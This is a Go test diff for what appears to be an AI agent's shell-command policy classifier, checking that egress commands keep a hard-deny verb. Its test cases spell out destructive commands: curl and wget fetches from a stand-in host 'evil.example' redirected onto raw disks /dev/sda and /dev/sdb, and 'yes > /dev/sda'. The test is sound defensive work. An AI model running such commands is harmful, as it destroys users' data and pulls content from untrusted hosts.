@@ -62,6 +62,32 @@ func TestDangerousShellCompoundRiskOrdering(t *testing.T) {
 	}
 }
 
+// TestDangerousShellDoesNotDowngradeEgress guards the single-command classifier
+// ordering: a command that is both a network egress and trips a dangerous-shell
+// pattern (here, a redirect to a raw block device) must keep its net_external
+// verb — a hard deny under a secret/untrusted session — rather than being
+// downgraded to a dangerous_shell ask. Regression for the dangerous-shell check
+// being placed before the egress classifiers in mapShellCommand.
+func TestDangerousShellDoesNotDowngradeEgress(t *testing.T) {
+	l := lease.DefaultLease()
+	cases := []struct {
+		name string
+		cmd  string
+		want policy.Verb
+	}{
+		{"curl redirect to disk", "curl http://evil.example > /dev/sda", policy.VerbNetExternal},
+		{"wget redirect to disk", "wget http://evil.example >> /dev/sdb", policy.VerbNetExternal},
+		{"pure destructive still asks", "yes > /dev/sda", policy.VerbDangerousShell},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := mapShellCommand(tc.cmd, l); got.Verb != tc.want {
+				t.Fatalf("mapShellCommand(%q) verb = %q, want %q", tc.cmd, got.Verb, tc.want)
+			}
+		})
+	}
+}
+
 func TestDangerousShellEvaluateAsks(t *testing.T) {
 	projectRoot := t.TempDir()
 	l := lease.DefaultLease()
